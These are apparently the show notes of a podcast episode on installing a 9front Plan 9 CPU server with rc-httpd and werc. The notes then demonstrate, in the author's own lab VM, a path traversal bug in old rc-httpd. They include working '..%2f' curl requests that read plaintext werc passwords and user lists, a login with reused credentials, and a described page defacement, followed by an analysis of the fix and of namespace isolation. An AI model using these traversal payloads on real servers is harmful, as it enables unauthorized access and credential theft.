@@ -1,0 +1,419 @@
+## hpr3686 ::  Followup for HPR3675: Clarifications on the path traversal bug
+
+ Followup for HPR3675: Installing a Plan 9 CPU server, Plan 9 web server, clarifications on the path traversal bug, private namespaces to the rescue, web application security models
+
+Installing Plan 9 with libvirt
+[root@localhost]# virt-install -n 9pwn \
+--description "pre-patched rc-httpd" \
+--osinfo=unknown \
+--memory=4096 \
+--vcpus=4 \
+--disk path=/var/lib/libvirt/images/9pwn.qcows,bus=virtio,size=10 \
+--graphics spice \
+--cdrom ~/Downloads/9front-8593.acc504c319a4b4188479cfa602e40cb6851c0528.amd64.iso \
+--network bridge=virbr0
+
+[root@localhost]# virt-viewer 9pwn
+
+How I find the IP of my guests and add it to my /etc/hosts for faster access.
+[root@localhost]# virsh domiflist 9pwn
+ Interface   Type     Source   Model   MAC
+----------------------------------------------------------
+ vnet3       bridge   virbr0   e1000   52:54:00:43:8a:50
+
+[root@localhost]# arp -e | grep 52:54:00:43:8a:50
+192.168.122.20           ether   52:54:00:43:8a:50   C                     virbr0
+
+[root@localhost]# echo cirno 192.168.122.20 >> /etc/hosts
+
+Proceed as normal with a 9 installation
+
+Set up CPU server with rc-httpd and werc
+I wrote about configuring a CPU server and also mirrored the notes at my 9front webserver containing a mirror of my plan 9 related things (using self-signed certs but it's fine) I've snarfed+pasted it here for the sake of completeness and modified it slightly so that it's more accessible for other people. I've also revised these notes so that they're less-broken. I may or may not update them.
+I'm using 9front for this. It has more secure authentication protocols when it comes to remotely connecting.
+Configuring a CPU server
+Add users to file server
+Connect to the file server and add a new user called <ExampleUser> who is in the groups sys, adm, and upas
+term% con -C /srv/cwfs.cmd
+newuser <ExampleUser>
+newuser sys +<ExampleUser>
+newuser adm +<ExampleUser>
+newuser upas +<ExampleUser>
+
+Reboot and set user=<ExampleUser> when prompted at boot time.
+Configure user's environment
+This is similar to cp -r /etc/skel /home/<ExampleUser> on a UNIX system.
+/sys/lib/newuser
+
+Configure headless booting
+Mount the boot partition:
+term% 9fs 9fat
+
+edit the boot config, /n/9fat/plan9.ini
+bootfile=9pc64
+nobootprompt=local!/dev/sdC0/fscache
+mouseport=ps2
+monitor=vesa
+vgasize=1024x768x14
+user=<ExampleUser>
+tiltscreen=none
+service=cpu
+
+Add hostowner info to nvram
+Hostowner is similar to root but not quite. In our configuration, hostowner is close to being equivalent to a root user. The user= line in our bootprompt sets the hostowner.
+For automatic booting (aka not entering a password at the physical machine every time we power it in), we need to add the hostowner's key to nvram.
+term% nvram=/dev/sdF0/nvram auth/wrkey
+bad nvram des key
+bad authentication id
+bad authentication domain
+authid: <ExampleUser>
+authdom: cirno
+secstore key: <press the return key if you do not want to type this at boot time>
+password: <make it 8 chars>
+
+Configure auth server
+In order to connect to the system over the network, the new user must be added to the auth server.
+term% auth/keyfs
+term% auth/changeuser <ExampleUser>
+Password: <what you put earlier>
+Confirm password:
+Assign new Inferno/POP secret? [y/n]: n
+Expiration date (YYYYMMDD or never) [never]: never
+Post id:
+User's full name:
+Department #:
+User's email address:
+Sponsor's email address:
+user <ExampleUser> installed for Plan 9
+
+Configure permissions
+/lib/ndb/auth is similar to a /etc/sudoers. This configuration for the new user allows him to execute commands as other users except for the sys and adm users (but sys and adm are more like groups but who cares).
+append to /lib/ndb/auth
+hostid=<ExampleUser>
+    uid=!sys uid=!adm uid=*
+
+then reboot
+Test if it worked with drawterm
+The 9front version of drawterm must be used as it supports the better crypto in 9front. Other drawterm versions probably won't work.
+$ /opt/drawterm -u <ExampleUser> -h example.com -a example.com -r ~/
+
+Configure rc-httpd
+edit /rc/bin/rc-httpd/select-handler
+this file is something like /etc/httpd.conf on a UNIX system.
+#!/bin/rc
+PATH_INFO=$location
+
+        switch($SERVER_NAME) {
+        case example.com
+               FS_ROOT=/sys/www/$SERVER_NAME
+               exec static-or-index
+
+        case *
+              error 503
+}
+
+To listen on port 80 and run the handler on port 80:
+cpu% cp /rc/bin/service/!tcp80 /rc/bin/service/tcp80
+cpu% chmod +x /rc/bin/rc-httpd/select-handler
+
+Reboot and test.
+SSL
+I will never give money to the CA racket. Self-signed is the way to go on systems that don't support acme.sh, the only ACME client I use for obtaining free SSL certs.
+Generate and install:
+cpu% ramfs -p
+cpu% cd /tmp
+cpu% auth/rsagen -t 'service=tls role=client owner=*' > key
+cpu% chmod 600 key
+cpu% cp key /sys/lib/tls/key
+cpu% auth/rsa2x509 'C=US CN=example.com' /sys/lib/tls/key | auth/pemencode CERTIFICATE > /sys/lib/tls/cert
+cpu% mkdir /cfg/$sysname
+cpu% echo 'cat /sys/lib/tls/key >> /mnt/factotum/ctl' >> /cfg/$sysname/cpustart
+
+Now add a listener in /rc/bin/service/tcp443:
+#!/bin/rc
+exec tlssrv -c /sys/lib/tls/cert -l /sys/log/https /rc/bin/service/tcp80 $*
+
+And make it executable:
+cpu% chmod +x /rc/bin/service/tcp443
+
+Install and configure werc
+cpu% cd
+cpu% mkdir /sys/www && cd www
+cpu% hget http://werc.cat-v.org/download/werc-1.5.0.tar.gz  > werc-1.5.0.tgz
+cpu% tar xzf werc-1.5.0.tgz
+cpu% mv werc-1.5.0 werc
+
+# ONLY DO THIS IF YOU *MUST* RUN THE THINGS THAT ALLOW WERC TO WRITE TO DISK
+# EG. DIRDIR, BLAGH, ETC
+# DON'T DO THIS, JUST USE DRAWTERM OVER THE NETWORK
+# HTTP CLIENTS SHOULD NEVER BE ALLOWED TO WRITE TO DISK
+# PLEASE I BEG YOU
+cpu% cd .. && for (i in `{du www | awk '{print $2}'}) chmod 777 $i
+
+cpu% cd werc/sites/
+cpu% mkdir example.com
+cpu% mv default.cat-v.org example.com
+
+now re-edit /rc/bin/rc-httpd/select-handler
+#!/bin/rc
+WERC=/sys/www/werc
+PLAN9=/
+PATH_INFO=$location
+switch($SERVER_NAME){
+case cirno
+        FS_ROOT=$WERC/sites/$SERVER_NAME
+        exec static-or-cgi $WERC/bin/werc.rc
+case *
+        error 503
+}
+
+Test the website. Werc is fiddly. Werc is archaic. Werc is fun.
+
+Path traversal vulnerabilities in old versions of rc-httpd
+Using release COMMUNITY VS INFRASTRUCTURE, an old release with old rc-httpd, I have done the above steps. In current releases this bug no longer exists. Use current releases.
+The vulnerability
+# get list of werc admin users
+[root@localhost]# curl http://cirno/..%2f..%2f/etc/users/admin/members
+pwn
+# get that werc user's password
+[root@localhost]# http://cirno/..%2f..%2f/etc/users/pwn/password
+supersecret
+
+Wait, the passwords for werc are stored in plain text? Let's log in
+[root@localhost]# firefox http://cirno/_users/login
+
+Now let's see if any of the werc users are also system users:
+# let's enumerate users
+[root@localhost]# curl http://cirno/..%2f..%2f..%2f..%2f..%2f..%2f/adm/users
+-1:adm:adm:glenda,pwn
+0:none::
+1:tor:tor:
+2:glenda:glenda:
+3:pwn:pwn:
+10000:sys::glenda,pwn
+10001:map:map:
+10002:doc::
+10003:upas:upas:glenda,pwn
+10004:font::
+10005:bootes:bootes:
+
+Let's hope that no one is re-using credentials. Let's check just to be sure
+$ PASS=supersecret /opt/drawterm -u pwn -h cirno -a cirno -G
+cpu% cat /env/sysname
+cirno
+cpu%
+
+This is what happens when you have path traversal vulnerabilities, an authentication vulnerability in your CMS, and share login/passwords
+How the static-or-cgi handler works
+rc-httpd calls various handler scripts that decide what to do with requests. In the example configuration for werc, rc-httpd is instructed to call the static-or-cgi script.
+I will compile these archaic rc scripts into pseudo code for the listener.
+The static-or-cgi handler (the handler specified in the httpd config) is simple:
+#!/bin/rc
+cgiargs=$*
+
+fn error{
+    if(~ $1 404)
+        exec cgi $cgiargs
+    if not
+        $rc_httpd_dir/handlers/error $1
+}
+
+if(~ $location */)
+    exec cgi $cgiargs
+if not
+    exec serve-static
+
+
+If the requested file exists, call the cgi handler and pass it arguments.
+If the requested file does not exist, call the serve-static handler.
+
+How the serve-static handler works
+The problem lies in the serve-static handler:
+#!/bin/rc
+full_path=`{echo $"FS_ROOT^$"PATH_INFO | urlencode -d}
+full_path=$"full_path
+if(~ $full_path */)
+    error 503
+if(test -d $full_path){
+    redirect perm $"location^'/' \
+        'URL not quite right, and browser did not accept redirect.'
+    exit
+}
+if(! test -e $full_path){
+    error 404
+    exit
+}
+if(! test -r $full_path){
+    error 503
+    exit
+}
+do_log 200
+switch($full_path){
+case *.html *.htm
+        type=text/html
+case *.css
+        type=text/css
+case *.txt *.md
+        type=text/plain
+case *.jpg *.jpeg
+        type=image/jpeg
+case *.gif
+        type=image/gif
+case *.png
+        type=image/png
+case *
+        type=`{file -m $full_path}
+}
+if(~ $type text/*)
+    type=$type^'; charset=utf-8'
+max_age=3600    # 1 hour
+echo 'HTTP/1.1 200 OK'^$cr
+emit_extra_headers
+echo 'Content-type: '^$type^$cr
+echo 'Content-length: '^`{ls -l $full_path | awk '{print $6}'}^$cr
+echo 'Cache-control: max-age='^$max_age^$cr
+echo $cr
+exec cat $full_path
+
+
+encode the full file path into a url
+if the url points to a file outside of '*/', the document root, error 503
+if the url is broken, exit
+if the url points to a file that neither exists nor is readable, error 503
+if you haven't exited by now, serve the file
+
+The problem is no sanitization. The script checks for files in the current directory BUT NOT BEFORE ENCODING THE URL STRING.
+The urlencode command works by decoding encoded characters.
+cpu% echo 'http://cirno/..%2f' | urlencode -d
+http://cirno/../
+
+Does ../ exist in */ ? the answer is yes.
+.. is a directory contained inside of */
+*/../ is the current working directory.
+How they fixed it
+Adding a sanitizer. By comparing the encoded url against an actual hypothetical file path and exiting if there is a mismatch, all %2f funny business is avoided.
+
+Other (optional) bad config options in werc
+rc-httpd aside, a bad werc config can still lead to website defacement if your non rc-httpd webserver has a path traversal vulnerability.
+Additionally I have modified the DAC for /sys/www to allow werc, a child process of rc-httpd to write to disk. rc-httpd runs as the none user so it's not typically allowed to write to disk unless explicitly permitted. I do not allow this on my 9 webserver because it's the worst idea in the history of all time ever.
+I enabled the dirdir and blagh modules as if I were the type of admin who does a chmod -R 777 /var/www/htdocs because that's what the wordpress installation guide told me to do so I could have a cool and easy way to modify my website from the browser.
+Let's pretend that I'm not the admin of this system and scrape the werc config just to see if the hypothetical badmin has these modules enabled.
+# get config
+[root@localhost]# curl http://cirno/..%2f..%2f/sites/cirno/_werc/config
+masterSite=cirno
+siteTitle='Werc Test Suite'
+conf_enable_wiki
+wiki_editor_groups admin
+
+Hmmm, looks like these modules are enabled so we can assume that httpd is allowed to write to disk. Let's modify cirno/index.md to warn the admin. As a funny joke. Totally not a crime under the Computer Fraud and Abuse Act. Totally not an inappropriate way to warn admins about a vulnerability.
+[root@localhost]# curl -s cirno | pandoc --from html --to plain
+quotes | docs | repo | golang | sam | man | acme | Glenda | 9times |
+harmful | 9P | cat-v.org
+
+Related sites: | site updates | site map |
+
+Werc Test Suite
+
+-   › apps/
+-   › titles/
+
+SECURITY ADVISORY:
+
+lol this guy still hasn't figured out the ..%2f trick
+
+Powered by werc
+
+Modifying werc to support password hashing
+Adding password hashes isn't too difficult. Being constrained by time, I have not done this quite yet. Reading the source code, all it takes is modifying 2 werc scripts: bin/werclib.rc and bin/aux/addwuser.rc
+% echo 'supersecret' | sha1sum -2 512
+
+
+Private namespaces to the rescue
+Luckily enough, the webserver runs as the none user with it's own namespace.
+Comparing the hostowner's namespace and none user's namespace
+I grab the namespace from the system console (ie not from drawterm) and from the listen command, then run a diff (unix style) to show the differences.
+cpu% ns | sort > cpu.ns
+cpu% ps -a | grep -e 'listen.*80' | grep -v grep
+none            355    0:00   0:00      132K Open     listen [/net/tcp/2 tcp!*!80]
+cpu% ns 355 | sort > listen.ns
+cpu% diff -u listen.ns cpu.ns
+--- listen.ns
++++ cpu.ns
+@@ -6,17 +6,29 @@
+ bind  /amd64/bin /bin
+ bind  /mnt /mnt
+ bind  /mnt/exportfs /mnt/exportfs
++bind  /mnt/temp/factotum /mnt/factotum
+ bind  /n /n
+ bind  /net /net
+ bind  /root /root
++bind -a '#$' /dev
+ bind -a '#I' /net
++bind -a '#P' /dev
++bind -a '#S' /dev
+ bind -a '#l' /net
++bind -a '#r' /dev
++bind -a '#t' /dev
++bind -a '#u' /dev
++bind -a '#u' /dev
+ bind -a '#¤' /dev
+ bind -a '#¶' /dev
++bind -a '#σ/usb' /dev
++bind -a '#σ/usbnet' /net
+ bind -a /rc/bin /bin
+ bind -a /root /
++bind -b '#k' /dev
+ bind -c '#e' /env
+ bind -c '#s' /srv
++bind -c /usr/pwn/tmp /tmp
+ cd /usr/pwn
+ mount -C '#s/boot' /n/other other
+ mount -a '#s/boot' /
+@@ -26,4 +38,4 @@
+ mount -a '#s/slashmnt' /mnt
+ mount -a '#s/slashn' /n
+ mount -aC '#s/boot' /root
+-mount -b '#s/factotum' /mnt
++mount -b '#s/cons' /dev
+
+The major difference is that the hostowner (equivalent to root user) has a lot more things bound to his namespace:
+
+'#$' PCI interfaces
+'#P' APM power management
+'#S' storage devices
+'#r' realtime clock and nvram
+'#t' serial ports
+'#u' USB
+'#σ' /shr global mountpoints
+'#k' keyboard
+/tmp directories
+'#s' various special files relating to services
+
+The listen process in question is fairly well isolated from the system. Minimal system damage can be caused by pwning a process owned by none.
+
+Closing
+An argument could be maid that the rc-httpd vulnerability was "not a bug" because "namespaces are supposed to segregate the system".
+I disagree on this point. Namespaces are good and all but security is a multi-layer thing. Relying on a single security feature to save your system means relying on a single point of failure. Chroot escapes, namespace escapes, container escapes, and VM escapes are all things we need to be thinking about when writing software that touches the internet. Although unlikely, getting pwnd in spite of these security methods is still possible; all user input is dangerous and all user input that becomes remote code execution always results in privilege escalation no matter how secure you think your operating system is. Each additional layer of security makes it harder for attackers to get into the system.
+For example, when I write PHP applications, I consider things in this order:
+
+don't pass unnecessary resources into the document root via symlinks, bind mounts, etc.
+never ever use system() in a context where user input can ever be passed to the function in order to avoid shell escapes
+sanitize all user input depending on context. Ex: if the PHP program is directly referencing files, make a whitelist and compare requests to this whitelist. If the PHP process is writing to a database, use prepared statements.
+fire up a kali linux vm and beat the test server half to death
+iterate upon my ignorance
+doubly verify DAC just to be sure
+re-check daemon configs to make sure I'm not doing anything stupid
+FINALLY: rely on SELinux or OpenBSD chroots (depending on prod env) to save me if all else failed
+
+And of course the other things like firewalls (with whitelists for ports and blacklists for entire IP address blocks), key based ssh authentication, sshd configurations that don't make it possible to enumerate users, rate limiters, etc.
+Each layer of security is like a filter. If you have enough layers of filters it would take an unrealistic amount of force to push water through this filter. Although no system is perfectly safe from three letter agencies, a system with multiple layers of security is typically safe from drive-by attacks.
+Final exercise: intentionally write a php script that does path traversal. Run this on a system with SELinux. Try to coax /etc/passwd out of the server. Now try php-fpm instead of mod_php or vice-versa. You'll be surprised when even MAC doesn't protect your system.
+Even now, after spending almost a month and a half worth of after work hacker hours almost exclusively on 9, I enjoy it more than when I began and even more than when using it in semi-regular spurts in years past. The purpose of research operating systems is to perform research, be it about the design of the system otherwise. Where would we be without private namespaces? How can I use this idea in the real world? What would the world look like if we had real distributed computing instead of web browsers (which are the new dumb terminal)? Is there a use case for this in the real world? What can we learn from single layer security models? What can we do to improve the system?
+Plan 9 is perfect for this type of research. I'm considering writing an httpd in C and a werc-like (minus the parts I don't like) in C and modifying the namespace for the listener so that I can run a webserver on 9 without pulling in /bin in order to reduce the possibility of a shell escape.
+I think that in order to improve ourselves, we must be critical of ourselves. We must be critical of the things we enjoy in order to improve them and learn something new in the process. For software especially, there is no such thing as perfection, only least bad. And my final thought:
+
+Criticism: This program/OS/whatever sucks
+
+
+Response: I know, help me fix it.
+
